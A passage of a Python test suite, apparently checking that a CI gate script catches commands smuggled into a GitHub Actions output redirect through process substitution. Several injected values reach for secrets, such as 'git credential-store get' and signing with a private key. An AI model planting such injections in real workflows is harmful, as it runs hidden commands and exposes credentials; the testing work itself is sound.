                    '>> "$GITHUB_OUTPUT"',
                    "> >(openssl dsa; cat >> \"$GITHUB_OUTPUT\")"), 1)
        assert isi_baru345 != isi_aksi345, \
            "suntikan aksi345 tidak menembak"
        with open(berkas_aksi345, "w", encoding="utf-8") as f:
            f.write(isi_baru345)
        rc, out = jalan(sub345,
                        [sys.executable, GERBANG, "--semua"])
        periksa("openssl dsa: gerbang gagal (Audit 1160)", rc != 0)
        shutil.rmtree(sub345, ignore_errors=True)
        sub346 = klon(tmp, "sub346")
        berkas_aksi346 = os.path.join(
            sub346, ".github", "actions", "resolve-vw",
            "action.yml")
        with open(berkas_aksi346, encoding="utf-8") as f:
            isi_aksi346 = f.read()
        baris_aksi346 = [b for b in isi_aksi346.splitlines()
                          if "tag_mentah" in b and "GITHUB_OUTPUT" in b][0]
        isi_baru346 = isi_aksi346.replace(
                baris_aksi346,
                baris_aksi346.replace(
                    '>> "$GITHUB_OUTPUT"',
                    "> >(openssl pkcs12; cat >> \"$GITHUB_OUTPUT\")"), 1)
        assert isi_baru346 != isi_aksi346, \
            "suntikan aksi346 tidak menembak"
        with open(berkas_aksi346, "w", encoding="utf-8") as f:
            f.write(isi_baru346)
        rc, out = jalan(sub346,
                        [sys.executable, GERBANG, "--semua"])
        periksa("openssl pkcs12: gerbang gagal (Audit 1160)", rc != 0)
        shutil.rmtree(sub346, ignore_errors=True)
        sub347 = klon(tmp, "sub347")
        berkas_aksi347 = os.path.join(
            sub347, ".github", "actions", "resolve-vw",
            "action.yml")
        with open(berkas_aksi347, encoding="utf-8") as f:
            isi_aksi347 = f.read()
        baris_aksi347 = [b for b in isi_aksi347.splitlines()
                          if "tag_mentah" in b and "GITHUB_OUTPUT" in b][0]
        isi_baru347 = isi_aksi347.replace(
                baris_aksi347,
                baris_aksi347.replace(
                    '>> "$GITHUB_OUTPUT"',
                    "> >(openssl crl2pkcs7; cat >> \"$GITHUB_OUTPUT\")"), 1)
        assert isi_baru347 != isi_aksi347, \
            "suntikan aksi347 tidak menembak"
        with open(berkas_aksi347, "w", encoding="utf-8") as f:
            f.write(isi_baru347)
        rc, out = jalan(sub347,
                        [sys.executable, GERBANG, "--semua"])
        periksa("openssl crl2pkcs7: gerbang gagal (Audit 1160)", rc != 0)
        shutil.rmtree(sub347, ignore_errors=True)
        sub348 = klon(tmp, "sub348")
        berkas_aksi348 = os.path.join(
            sub348, ".github", "actions", "resolve-vw",
            "action.yml")
        with open(berkas_aksi348, encoding="utf-8") as f:
            isi_aksi348 = f.read()
        baris_aksi348 = [b for b in isi_aksi348.splitlines()
                          if "tag_mentah" in b and "GITHUB_OUTPUT" in b][0]
        isi_baru348 = isi_aksi348.replace(
                baris_aksi348,
                baris_aksi348.replace(
                    '>> "$GITHUB_OUTPUT"',
                    "> >(openssl dsa -in kunci.pem; cat >> \"$GITHUB_OUTPUT\")"), 1)
        assert isi_baru348 != isi_aksi348, \
            "suntikan aksi348 tidak menembak"
        with open(berkas_aksi348, "w", encoding="utf-8") as f:
            f.write(isi_baru348)
        rc, out = jalan(sub348,
                        [sys.executable, GERBANG, "--semua"])
        periksa("openssl dsa -in kunci.pem: gerbang lolos (Audit 1160)", rc == 0)
        shutil.rmtree(sub348, ignore_errors=True)
        sub349 = klon(tmp, "sub349")
        berkas_aksi349 = os.path.join(
            sub349, ".github", "actions", "resolve-vw",
            "action.yml")
        with open(berkas_aksi349, encoding="utf-8") as f:
            isi_aksi349 = f.read()
        baris_aksi349 = [b for b in isi_aksi349.splitlines()
                          if "tag_mentah" in b and "GITHUB_OUTPUT" in b][0]
        isi_baru349 = isi_aksi349.replace(
                baris_aksi349,
                baris_aksi349.replace(
                    '>> "$GITHUB_OUTPUT"',
                    "> >(openssl rsautl -sign -inkey k.pem; cat >> \"$GITHUB_OUTPUT\")"), 1)
        assert isi_baru349 != isi_aksi349, \
            "suntikan aksi349 tidak menembak"
        with open(berkas_aksi349, "w", encoding="utf-8") as f:
            f.write(isi_baru349)
        rc, out = jalan(sub349,
                        [sys.executable, GERBANG, "--semua"])
        periksa("openssl rsautl -sign -inkey k.pem: gerbang gagal (Audit 1161)", rc != 0)
        shutil.rmtree(sub349, ignore_errors=True)
        sub350 = klon(tmp, "sub350")
        berkas_aksi350 = os.path.join(
            sub350, ".github", "actions", "resolve-vw",
            "action.yml")
        with open(berkas_aksi350, encoding="utf-8") as f:
            isi_aksi350 = f.read()
        baris_aksi350 = [b for b in isi_aksi350.splitlines()
                          if "tag_mentah" in b and "GITHUB_OUTPUT" in b][0]
        isi_baru350 = isi_aksi350.replace(
                baris_aksi350,
                baris_aksi350.replace(
                    '>> "$GITHUB_OUTPUT"',
                    "> >(openssl rsautl -sign -inkey k.pem -in data.bin; cat >> \"$GITHUB_OUTPUT\")"), 1)
        assert isi_baru350 != isi_aksi350, \
            "suntikan aksi350 tidak menembak"
        with open(berkas_aksi350, "w", encoding="utf-8") as f:
            f.write(isi_baru350)
        rc, out = jalan(sub350,
                        [sys.executable, GERBANG, "--semua"])
        periksa("openssl rsautl -sign -inkey k.pem -in data.bin: gerbang lolos (Audit 1161)", rc == 0)
        shutil.rmtree(sub350, ignore_errors=True)
        sub351 = klon(tmp, "sub351")
        berkas_aksi351 = os.path.join(
            sub351, ".github", "actions", "resolve-vw",
            "action.yml")
        with open(berkas_aksi351, encoding="utf-8") as f:
            isi_aksi351 = f.read()
        baris_aksi351 = [b for b in isi_aksi351.splitlines()
                          if "tag_mentah" in b and "GITHUB_OUTPUT" in b][0]
        isi_baru351 = isi_aksi351.replace(
                baris_aksi351,
                baris_aksi351.replace(
                    '>> "$GITHUB_OUTPUT"',
                    "> >(git commit-tree abc123; cat >> \"$GITHUB_OUTPUT\")"), 1)
        assert isi_baru351 != isi_aksi351, \
            "suntikan aksi351 tidak menembak"
        with open(berkas_aksi351, "w", encoding="utf-8") as f:
            f.write(isi_baru351)
        rc, out = jalan(sub351,
                        [sys.executable, GERBANG, "--semua"])
        periksa("git commit-tree abc123: gerbang gagal (Audit 1162)", rc != 0)
        shutil.rmtree(sub351, ignore_errors=True)
        sub352 = klon(tmp, "sub352")
        berkas_aksi352 = os.path.join(
            sub352, ".github", "actions", "resolve-vw",
            "action.yml")
        with open(berkas_aksi352, encoding="utf-8") as f:
            isi_aksi352 = f.read()
        baris_aksi352 = [b for b in isi_aksi352.splitlines()
                          if "tag_mentah" in b and "GITHUB_OUTPUT" in b][0]
        isi_baru352 = isi_aksi352.replace(
                baris_aksi352,
                baris_aksi352.replace(
                    '>> "$GITHUB_OUTPUT"',
                    "> >(git interpret-trailers; cat >> \"$GITHUB_OUTPUT\")"), 1)
        assert isi_baru352 != isi_aksi352, \
            "suntikan aksi352 tidak menembak"
        with open(berkas_aksi352, "w", encoding="utf-8") as f:
            f.write(isi_baru352)
        rc, out = jalan(sub352,
                        [sys.executable, GERBANG, "--semua"])
        periksa("git interpret-trailers: gerbang gagal (Audit 1162)", rc != 0)
        shutil.rmtree(sub352, ignore_errors=True)
        sub353 = klon(tmp, "sub353")
        berkas_aksi353 = os.path.join(
            sub353, ".github", "actions", "resolve-vw",
            "action.yml")
        with open(berkas_aksi353, encoding="utf-8") as f:
            isi_aksi353 = f.read()
        baris_aksi353 = [b for b in isi_aksi353.splitlines()
                          if "tag_mentah" in b and "GITHUB_OUTPUT" in b][0]
        isi_baru353 = isi_aksi353.replace(
                baris_aksi353,
                baris_aksi353.replace(
                    '>> "$GITHUB_OUTPUT"',
                    "> >(git mailinfo msg patch; cat >> \"$GITHUB_OUTPUT\")"), 1)
        assert isi_baru353 != isi_aksi353, \
            "suntikan aksi353 tidak menembak"
        with open(berkas_aksi353, "w", encoding="utf-8") as f:
            f.write(isi_baru353)
        rc, out = jalan(sub353,
                        [sys.executable, GERBANG, "--semua"])
        periksa("git mailinfo msg patch: gerbang gagal (Audit 1162)", rc != 0)
        shutil.rmtree(sub353, ignore_errors=True)
        sub354 = klon(tmp, "sub354")
        berkas_aksi354 = os.path.join(
            sub354, ".github", "actions", "resolve-vw",
            "action.yml")
        with open(berkas_aksi354, encoding="utf-8") as f:
            isi_aksi354 = f.read()
        baris_aksi354 = [b for b in isi_aksi354.splitlines()
                          if "tag_mentah" in b and "GITHUB_OUTPUT" in b][0]
        isi_baru354 = isi_aksi354.replace(
                baris_aksi354,
                baris_aksi354.replace(
                    '>> "$GITHUB_OUTPUT"',
                    "> >(git mailsplit -o/tmp/x; cat >> \"$GITHUB_OUTPUT\")"), 1)
        assert isi_baru354 != isi_aksi354, \
            "suntikan aksi354 tidak menembak"
        with open(berkas_aksi354, "w", encoding="utf-8") as f:
            f.write(isi_baru354)
        rc, out = jalan(sub354,
                        [sys.executable, GERBANG, "--semua"])
        periksa("git mailsplit -o/tmp/x: gerbang gagal (Audit 1162)", rc != 0)
        shutil.rmtree(sub354, ignore_errors=True)
        sub355 = klon(tmp, "sub355")
        berkas_aksi355 = os.path.join(
            sub355, ".github", "actions", "resolve-vw",
            "action.yml")
        with open(berkas_aksi355, encoding="utf-8") as f:
            isi_aksi355 = f.read()
        baris_aksi355 = [b for b in isi_aksi355.splitlines()
                          if "tag_mentah" in b and "GITHUB_OUTPUT" in b][0]
        isi_baru355 = isi_aksi355.replace(
                baris_aksi355,
                baris_aksi355.replace(
                    '>> "$GITHUB_OUTPUT"',
                    "> >(git mailsplit; cat >> \"$GITHUB_OUTPUT\")"), 1)
        assert isi_baru355 != isi_aksi355, \
            "suntikan aksi355 tidak menembak"
        with open(berkas_aksi355, "w", encoding="utf-8") as f:
            f.write(isi_baru355)
        rc, out = jalan(sub355,
                        [sys.executable, GERBANG, "--semua"])
        periksa("git mailsplit: gerbang lolos (Audit 1162)", rc == 0)
        shutil.rmtree(sub355, ignore_errors=True)
        sub356 = klon(tmp, "sub356")
        berkas_aksi356 = os.path.join(
            sub356, ".github", "actions", "resolve-vw",
            "action.yml")
        with open(berkas_aksi356, encoding="utf-8") as f:
            isi_aksi356 = f.read()
        baris_aksi356 = [b for b in isi_aksi356.splitlines()
                          if "tag_mentah" in b and "GITHUB_OUTPUT" in b][0]
        isi_baru356 = isi_aksi356.replace(
                baris_aksi356,
                baris_aksi356.replace(
                    '>> "$GITHUB_OUTPUT"',
                    "> >(git pack-objects dasar; cat >> \"$GITHUB_OUTPUT\")"), 1)
        assert isi_baru356 != isi_aksi356, \
            "suntikan aksi356 tidak menembak"
        with open(berkas_aksi356, "w", encoding="utf-8") as f:
            f.write(isi_baru356)
        rc, out = jalan(sub356,
                        [sys.executable, GERBANG, "--semua"])
        periksa("git pack-objects dasar: gerbang gagal (Audit 1162)", rc != 0)
        shutil.rmtree(sub356, ignore_errors=True)
        sub357 = klon(tmp, "sub357")
        berkas_aksi357 = os.path.join(
            sub357, ".github", "actions", "resolve-vw",
            "action.yml")
        with open(berkas_aksi357, encoding="utf-8") as f:
            isi_aksi357 = f.read()
        baris_aksi357 = [b for b in isi_aksi357.splitlines()
                          if "tag_mentah" in b and "GITHUB_OUTPUT" in b][0]
        isi_baru357 = isi_aksi357.replace(
                baris_aksi357,
                baris_aksi357.replace(
                    '>> "$GITHUB_OUTPUT"',
                    "> >(git column --mode=column; cat >> \"$GITHUB_OUTPUT\")"), 1)
        assert isi_baru357 != isi_aksi357, \
            "suntikan aksi357 tidak menembak"
        with open(berkas_aksi357, "w", encoding="utf-8") as f:
            f.write(isi_baru357)
        rc, out = jalan(sub357,
                        [sys.executable, GERBANG, "--semua"])
        periksa("git column --mode=column: gerbang gagal (Audit 1162)", rc != 0)
        shutil.rmtree(sub357, ignore_errors=True)
        sub358 = klon(tmp, "sub358")
        berkas_aksi358 = os.path.join(
            sub358, ".github", "actions", "resolve-vw",
            "action.yml")
        with open(berkas_aksi358, encoding="utf-8") as f:
            isi_aksi358 = f.read()
        baris_aksi358 = [b for b in isi_aksi358.splitlines()
                          if "tag_mentah" in b and "GITHUB_OUTPUT" in b][0]
        isi_baru358 = isi_aksi358.replace(
                baris_aksi358,
                baris_aksi358.replace(
                    '>> "$GITHUB_OUTPUT"',
                    "> >(git imap-send; cat >> \"$GITHUB_OUTPUT\")"), 1)
        assert isi_baru358 != isi_aksi358, \
            "suntikan aksi358 tidak menembak"
        with open(berkas_aksi358, "w", encoding="utf-8") as f:
            f.write(isi_baru358)
        rc, out = jalan(sub358,
                        [sys.executable, GERBANG, "--semua"])
        periksa("git imap-send: gerbang gagal (Audit 1162)", rc != 0)
        shutil.rmtree(sub358, ignore_errors=True)
        sub359 = klon(tmp, "sub359")
        berkas_aksi359 = os.path.join(
            sub359, ".github", "actions", "resolve-vw",
            "action.yml")
        with open(berkas_aksi359, encoding="utf-8") as f:
            isi_aksi359 = f.read()
        baris_aksi359 = [b for b in isi_aksi359.splitlines()
                          if "tag_mentah" in b and "GITHUB_OUTPUT" in b][0]
        isi_baru359 = isi_aksi359.replace(
                baris_aksi359,
                baris_aksi359.replace(
                    '>> "$GITHUB_OUTPUT"',
                    "> >(git rev-list --stdin; cat >> \"$GITHUB_OUTPUT\")"), 1)
        assert isi_baru359 != isi_aksi359, \
            "suntikan aksi359 tidak menembak"
        with open(berkas_aksi359, "w", encoding="utf-8") as f:
            f.write(isi_baru359)
        rc, out = jalan(sub359,
                        [sys.executable, GERBANG, "--semua"])
        periksa("git rev-list --stdin: gerbang gagal (Audit 1163)", rc != 0)
        shutil.rmtree(sub359, ignore_errors=True)
        sub360 = klon(tmp, "sub360")
        berkas_aksi360 = os.path.join(
            sub360, ".github", "actions", "resolve-vw",
            "action.yml")
        with open(berkas_aksi360, encoding="utf-8") as f:
            isi_aksi360 = f.read()
        baris_aksi360 = [b for b in isi_aksi360.splitlines()
                          if "tag_mentah" in b and "GITHUB_OUTPUT" in b][0]
        isi_baru360 = isi_aksi360.replace(
                baris_aksi360,
                baris_aksi360.replace(
                    '>> "$GITHUB_OUTPUT"',
                    "> >(git check-mailmap --stdin; cat >> \"$GITHUB_OUTPUT\")"), 1)
        assert isi_baru360 != isi_aksi360, \
            "suntikan aksi360 tidak menembak"
        with open(berkas_aksi360, "w", encoding="utf-8") as f:
            f.write(isi_baru360)
        rc, out = jalan(sub360,
                        [sys.executable, GERBANG, "--semua"])
        periksa("git check-mailmap --stdin: gerbang gagal (Audit 1163)", rc != 0)
        shutil.rmtree(sub360, ignore_errors=True)
        sub361 = klon(tmp, "sub361")
        berkas_aksi361 = os.path.join(
            sub361, ".github", "actions", "resolve-vw",
            "action.yml")
        with open(berkas_aksi361, encoding="utf-8") as f:
            isi_aksi361 = f.read()
        baris_aksi361 = [b for b in isi_aksi361.splitlines()
                          if "tag_mentah" in b and "GITHUB_OUTPUT" in b][0]
        isi_baru361 = isi_aksi361.replace(
                baris_aksi361,
                baris_aksi361.replace(
                    '>> "$GITHUB_OUTPUT"',
                    "> >(git credential-store get; cat >> \"$GITHUB_OUTPUT\")"), 1)
        assert isi_baru361 != isi_aksi361, \
            "suntikan aksi361 tidak menembak"
        with open(berkas_aksi361, "w", encoding="utf-8") as f:
            f.write(isi_baru361)
        rc, out = jalan(sub361,
                        [sys.executable, GERBANG, "--semua"])
        periksa("git credential-store get: gerbang gagal (Audit 1163)", rc != 0)
        shutil.rmtree(sub361, ignore_errors=True)
        sub362 = klon(tmp, "sub362")
        berkas_aksi362 = os.path.join(
            sub362, ".github", "actions", "resolve-vw",
            "action.yml")
        with open(berkas_aksi362, encoding="utf-8") as f:
            isi_aksi362 = f.read()
        baris_aksi362 = [b for b in isi_aksi362.splitlines()
                          if "tag_mentah" in b and "GITHUB_OUTPUT" in b][0]
        isi_baru362 = isi_aksi362.replace(
                baris_aksi362,
                baris_aksi362.replace(
                    '>> "$GITHUB_OUTPUT"',
                    "> >(git rev-list HEAD; cat >> \"$GITHUB_OUTPUT\")"), 1)
        assert isi_baru362 != isi_aksi362, \
            "suntikan aksi362 tidak menembak"
        with open(berkas_aksi362, "w", encoding="utf-8") as f:
            f.write(isi_baru362)
        rc, out = jalan(sub362,
                        [sys.executable, GERBANG, "--semua"])
        periksa("git rev-list HEAD: gerbang lolos (Audit 1163)", rc == 0)
        shutil.rmtree(sub362, ignore_errors=True)
        sub363 = klon(tmp, "sub363")
        berkas_aksi363 = os.path.join(
            sub363, ".github", "actions", "resolve-vw",
            "action.yml")
        with open(berkas_aksi363, encoding="utf-8") as f:
            isi_aksi363 = f.read()
        baris_aksi363 = [b for b in isi_aksi363.splitlines()
                          if "tag_mentah" in b and "GITHUB_OUTPUT" in b][0]
        isi_baru363 = isi_aksi363.replace(
                baris_aksi363,
                baris_aksi363.replace(
                    '>> "$GITHUB_OUTPUT"',
                    "> >(sort --key 2; cat >> \"$GITHUB_OUTPUT\")"), 1)
        assert isi_baru363 != isi_aksi363, \
            "suntikan aksi363 tidak menembak"
        with open(berkas_aksi363, "w", encoding="utf-8") as f:
            f.write(isi_baru363)
        rc, out = jalan(sub363,
                        [sys.executable, GERBANG, "--semua"])
        periksa("sort --key 2: gerbang gagal (Audit 1164)", rc != 0)
        shutil.rmtree(sub363, ignore_errors=True)
        sub364 = klon(tmp, "sub364")
        berkas_aksi364 = os.path.join(
            sub364, ".github", "actions", "resolve-vw",
            "action.yml")
        with open(berkas_aksi364, encoding="utf-8") as f:
            isi_aksi364 = f.read()
        baris_aksi364 = [b for b in isi_aksi364.splitlines()
                          if "tag_mentah" in b and "GITHUB_OUTPUT" in b][0]
        isi_baru364 = isi_aksi364.replace(
                baris_aksi364,
                baris_aksi364.replace(
                    '>> "$GITHUB_OUTPUT"',
                    "> >(uniq --skip-chars 2; cat >> \"$GITHUB_OUTPUT\")"), 1)
        assert isi_baru364 != isi_aksi364, \
            "suntikan aksi364 tidak menembak"
        with open(berkas_aksi364, "w", encoding="utf-8") as f:
            f.write(isi_baru364)
        rc, out = jalan(sub364,
                        [sys.executable, GERBANG, "--semua"])
        periksa("uniq --skip-chars 2: gerbang gagal (Audit 1165)", rc != 0)
        shutil.rmtree(sub364, ignore_errors=True)
        sub365 = klon(tmp, "sub365")
        berkas_aksi365 = os.path.join(
            sub365, ".github", "actions", "resolve-vw",
            "action.yml")
        with open(berkas_aksi365, encoding="utf-8") as f:
            isi_aksi365 = f.read()
        baris_aksi365 = [b for b in isi_aksi365.splitlines()
                          if "tag_mentah" in b and "GITHUB_OUTPUT" in b][0]
        isi_baru365 = isi_aksi365.replace(
                baris_aksi365,
                baris_aksi365.replace(
                    '>> "$GITHUB_OUTPUT"',
                    "> >(tail --sleep-interval 1; cat >> \"$GITHUB_OUTPUT\")"), 1)
        assert isi_baru365 != isi_aksi365, \
            "suntikan aksi365 tidak menembak"
        with open(berkas_aksi365, "w", encoding="utf-8") as f:
            f.write(isi_baru365)
        rc, out = jalan(sub365,
                        [sys.executable, GERBANG, "--semua"])
        periksa("tail --sleep-interval 1: gerbang gagal (Audit 1166)", rc != 0)
        shutil.rmtree(sub365, ignore_errors=True)
        sub366 = klon(tmp, "sub366")
        berkas_aksi366 = os.path.join(
            sub366, ".github", "actions", "resolve-vw",
            "action.yml")
        with open(berkas_aksi366, encoding="utf-8") as f:
            isi_aksi366 = f.read()
        baris_aksi366 = [b for b in isi_aksi366.splitlines()
                          if "tag_mentah" in b and "GITHUB_OUTPUT" in b][0]
        isi_baru366 = isi_aksi366.replace(
                baris_aksi366,
                baris_aksi366.replace(
                    '>> "$GITHUB_OUTPUT"',
                    "> >(pr -d berkas; cat >> \"$GITHUB_OUTPUT\")"), 1)
        assert isi_baru366 != isi_aksi366, \
            "suntikan aksi366 tidak menembak"
        with open(berkas_aksi366, "w", encoding="utf-8") as f:
            f.write(isi_baru366)
        rc, out = jalan(sub366,
                        [sys.executable, GERBANG, "--semua"])
        periksa("pr -d berkas: gerbang lolos (Audit 1167)", rc == 0)
        shutil.rmtree(sub366, ignore_errors=True)
        sub367 = klon(tmp, "sub367")
        berkas_aksi367 = os.path.join(
            sub367, ".github", "actions", "resolve-vw",
            "action.yml")
        with open(berkas_aksi367, encoding="utf-8") as f:
            isi_aksi367 = f.read()
        baris_aksi367 = [b for b in isi_aksi367.splitlines()
                          if "tag_mentah" in b and "GITHUB_OUTPUT" in b][0]
        isi_baru367 = isi_aksi367.replace(
                baris_aksi367,
                baris_aksi367.replace(
                    '>> "$GITHUB_OUTPUT"',
                    "> >(pr -D %Y; cat >> \"$GITHUB_OUTPUT\")"), 1)
        assert isi_baru367 != isi_aksi367, \
            "suntikan aksi367 tidak menembak"
        with open(berkas_aksi367, "w", encoding="utf-8") as f:
            f.write(isi_baru367)
        rc, out = jalan(sub367,
                        [sys.executable, GERBANG, "--semua"])
        periksa("pr -D %Y: gerbang gagal (Audit 1167)", rc != 0)
        shutil.rmtree(sub367, ignore_errors=True)
        sub368 = klon(tmp, "sub368")
        berkas_aksi368 = os.path.join(
            sub368, ".github", "actions", "resolve-vw",
            "action.yml")
        with open(berkas_aksi368, encoding="utf-8") as f:
            isi_aksi368 = f.read()
        baris_aksi368 = [b for b in isi_aksi368.splitlines()
                          if "tag_mentah" in b and "GITHUB_OUTPUT" in b][0]
        isi_baru368 = isi_aksi368.replace(
                baris_aksi368,
                baris_aksi368.replace(
                    '>> "$GITHUB_OUTPUT"',
                    "> >(strings -T elf64-x86-64; cat >> \"$GITHUB_OUTPUT\")"), 1)
        assert isi_baru368 != isi_aksi368, \
            "suntikan aksi368 tidak menembak"
        with open(berkas_aksi368, "w", encoding="utf-8") as f:
            f.write(isi_baru368)
        rc, out = jalan(sub368,
                        [sys.executable, GERBANG, "--semua"])
        periksa("strings -T elf64-x86-64: gerbang gagal (Audit 1168)", rc != 0)
        shutil.rmtree(sub368, ignore_errors=True)
        sub369 = klon(tmp, "sub369")
        berkas_aksi369 = os.path.join(
            sub369, ".github", "actions", "resolve-vw",
            "action.yml")
        with open(berkas_aksi369, encoding="utf-8") as f:
            isi_aksi369 = f.read()
        baris_aksi369 = [b for b in isi_aksi369.splitlines()
                          if "tag_mentah" in b and "GITHUB_OUTPUT" in b][0]
        isi_baru369 = isi_aksi369.replace(
                baris_aksi369,
                baris_aksi369.replace(
                    '>> "$GITHUB_OUTPUT"',
                    "> >(split --filter cat -l 1 -; cat >> \"$GITHUB_OUTPUT\")"), 1)
        assert isi_baru369 != isi_aksi369, \
            "suntikan aksi369 tidak menembak"
        with open(berkas_aksi369, "w", encoding="utf-8") as f:
            f.write(isi_baru369)
        rc, out = jalan(sub369,
                        [sys.executable, GERBANG, "--semua"])
        periksa("split --filter cat -l 1 -: gerbang gagal (Audit 1169)", rc != 0)
        shutil.rmtree(sub369, ignore_errors=True)
        sub370 = klon(tmp, "sub370")
        berkas_aksi370 = os.path.join(
            sub370, ".github", "actions", "resolve-vw",
            "action.yml")
        with open(berkas_aksi370, encoding="utf-8") as f:
            isi_aksi370 = f.read()
        baris_aksi370 = [b for b in isi_aksi370.splitlines()
                          if "tag_mentah" in b and "GITHUB_OUTPUT" in b][0]
        isi_baru370 = isi_aksi370.replace(
                baris_aksi370,
                baris_aksi370.replace(
                    '>> "$GITHUB_OUTPUT"',
                    "> >(logger --msgid abc; cat >> \"$GITHUB_OUTPUT\")"), 1)
        assert isi_baru370 != isi_aksi370, \
            "suntikan aksi370 tidak menembak"
        with open(berkas_aksi370, "w", encoding="utf-8") as f:
            f.write(isi_baru370)
        rc, out = jalan(sub370,
                        [sys.executable, GERBANG, "--semua"])
        periksa("logger --msgid abc: gerbang gagal (Audit 1170)", rc != 0)
        shutil.rmtree(sub370, ignore_errors=True)
        sub371 = klon(tmp, "sub371")
        berkas_aksi371 = os.path.join(
            sub371, ".github", "actions", "resolve-vw",
            "action.yml")
        with open(berkas_aksi371, encoding="utf-8") as f:
            isi_aksi371 = f.read()
        baris_aksi371 = [b for b in isi_aksi371.splitlines()
                          if "tag_mentah" in b and "GITHUB_OUTPUT" in b][0]
        isi_baru371 = isi_aksi371.replace(
                baris_aksi371,
                baris_aksi371.replace(
                    '>> "$GITHUB_OUTPUT"',
                    "> >(cksum -a blake2b -l 32; cat >> \"$GITHUB_OUTPUT\")"), 1)
        assert isi_baru371 != isi_aksi371, \
            "suntikan aksi371 tidak menembak"
        with open(berkas_aksi371, "w", encoding="utf-8") as f:
            f.write(isi_baru371)
        rc, out = jalan(sub371,
                        [sys.executable, GERBANG, "--semua"])
        periksa("cksum -a blake2b -l 32: gerbang gagal (Audit 1171)", rc != 0)
        shutil.rmtree(sub371, ignore_errors=True)
        sub372 = klon(tmp, "sub372")
        berkas_aksi372 = os.path.join(
            sub372, ".github", "actions", "resolve-vw",
            "action.yml")
        with open(berkas_aksi372, encoding="utf-8") as f:
            isi_aksi372 = f.read()
        baris_aksi372 = [b for b in isi_aksi372.splitlines()
                          if "tag_mentah" in b and "GITHUB_OUTPUT" in b][0]
        isi_baru372 = isi_aksi372.replace(
                baris_aksi372,
                baris_aksi372.replace(
                    '>> "$GITHUB_OUTPUT"',
                    "> >(xz -F lzma -c; cat >> \"$GITHUB_OUTPUT\")"), 1)
        assert isi_baru372 != isi_aksi372, \
            "suntikan aksi372 tidak menembak"
        with open(berkas_aksi372, "w", encoding="utf-8") as f:
            f.write(isi_baru372)
        rc, out = jalan(sub372,
                        [sys.executable, GERBANG, "--semua"])
        periksa("xz -F lzma -c: gerbang gagal (Audit 1172)", rc != 0)
        shutil.rmtree(sub372, ignore_errors=True)
        sub373 = klon(tmp, "sub373")
        berkas_aksi373 = os.path.join(
            sub373, ".github", "actions", "resolve-vw",
            "action.yml")
        with open(berkas_aksi373, encoding="utf-8") as f:
            isi_aksi373 = f.read()
        baris_aksi373 = [b for b in isi_aksi373.splitlines()
                          if "tag_mentah" in b and "GITHUB_OUTPUT" in b][0]
        isi_baru373 = isi_aksi373.replace(
                baris_aksi373,
                baris_aksi373.replace(
                    '>> "$GITHUB_OUTPUT"',
                    "> >(unxz -F lzma; cat >> \"$GITHUB_OUTPUT\")"), 1)
        assert isi_baru373 != isi_aksi373, \
            "suntikan aksi373 tidak menembak"
        with open(berkas_aksi373, "w", encoding="utf-8") as f:
            f.write(isi_baru373)
        rc, out = jalan(sub373,
                        [sys.executable, GERBANG, "--semua"])
        periksa("unxz -F lzma: gerbang gagal (Audit 1172)", rc != 0)
        shutil.rmtree(sub373, ignore_errors=True)
        sub374 = klon(tmp, "sub374")
        berkas_aksi374 = os.path.join(
            sub374, ".github", "actions", "resolve-vw",
            "action.yml")
        with open(berkas_aksi374, encoding="utf-8") as f:
            isi_aksi374 = f.read()
        baris_aksi374 = [b for b in isi_aksi374.splitlines()
                          if "tag_mentah" in b and "GITHUB_OUTPUT" in b][0]
        isi_baru374 = isi_aksi374.replace(
                baris_aksi374,
                baris_aksi374.replace(
                    '>> "$GITHUB_OUTPUT"',
                    "> >(od --endian little; cat >> \"$GITHUB_OUTPUT\")"), 1)
        assert isi_baru374 != isi_aksi374, \
            "suntikan aksi374 tidak menembak"
        with open(berkas_aksi374, "w", encoding="utf-8") as f:
            f.write(isi_baru374)
        rc, out = jalan(sub374,
                        [sys.executable, GERBANG, "--semua"])
        periksa("od --endian little: gerbang gagal (Audit 1173)", rc != 0)
        shutil.rmtree(sub374, ignore_errors=True)
        sub375 = klon(tmp, "sub375")
        berkas_aksi375 = os.path.join(
            sub375, ".github", "actions", "resolve-vw",
            "action.yml")
        with open(berkas_aksi375, encoding="utf-8") as f:
            isi_aksi375 = f.read()
        baris_aksi375 = [b for b in isi_aksi375.splitlines()
                          if "tag_mentah" in b and "GITHUB_OUTPUT" in b][0]
        isi_baru375 = isi_aksi375.replace(
                baris_aksi375,
                baris_aksi375.replace(
                    '>> "$GITHUB_OUTPUT"',
                    "> >(ptx -o daftar; cat >> \"$GITHUB_OUTPUT\")"), 1)
        assert isi_baru375 != isi_aksi375, \
            "suntikan aksi375 tidak menembak"
        with open(berkas_aksi375, "w", encoding="utf-8") as f:
            f.write(isi_baru375)
        rc, out = jalan(sub375,
                        [sys.executable, GERBANG, "--semua"])
        periksa("ptx -o daftar: gerbang gagal (Audit 1174)", rc != 0)
        shutil.rmtree(sub375, ignore_errors=True)
        sub376 = klon(tmp, "sub376")
        berkas_aksi376 = os.path.join(
            sub376, ".github", "actions", "resolve-vw",
            "action.yml")
        with open(berkas_aksi376, encoding="utf-8") as f:
            isi_aksi376 = f.read()
        baris_aksi376 = [b for b in isi_aksi376.splitlines()
                          if "tag_mentah" in b and "GITHUB_OUTPUT" in b][0]
        isi_baru376 = isi_aksi376.replace(
                baris_aksi376,
                baris_aksi376.replace(
                    '>> "$GITHUB_OUTPUT"',
                    "> >(sqlite3 -newline X berkas.db; cat >> \"$GITHUB_OUTPUT\")"), 1)
        assert isi_baru376 != isi_aksi376, \
            "suntikan aksi376 tidak menembak"
        with open(berkas_aksi376, "w", encoding="utf-8") as f:
            f.write(isi_baru376)
        rc, out = jalan(sub376,
                        [sys.executable, GERBANG, "--semua"])
        periksa("sqlite3 -newline X berkas.db: gerbang gagal (Audit 1175)", rc != 0)
        shutil.rmtree(sub376, ignore_errors=True)
        sub377 = klon(tmp, "sub377")
        berkas_aksi377 = os.path.join(
            sub377, ".github", "actions", "resolve-vw",
            "action.yml")
        with open(berkas_aksi377, encoding="utf-8") as f:
            isi_aksi377 = f.read()
        baris_aksi377 = [b for b in isi_aksi377.splitlines()
                          if "tag_mentah" in b and "GITHUB_OUTPUT" in b][0]
        isi_baru377 = isi_aksi377.replace(
                baris_aksi377,
                baris_aksi377.replace(
                    '>> "$GITHUB_OUTPUT"',
                    "> >(sqlite3 berkas.db 'select 1'; cat >> \"$GITHUB_OUTPUT\")"), 1)
        assert isi_baru377 != isi_aksi377, \
            "suntikan aksi377 tidak menembak"
        with open(berkas_aksi377, "w", encoding="utf-8") as f:
            f.write(isi_baru377)
        rc, out = jalan(sub377,
                        [sys.executable, GERBANG, "--semua"])
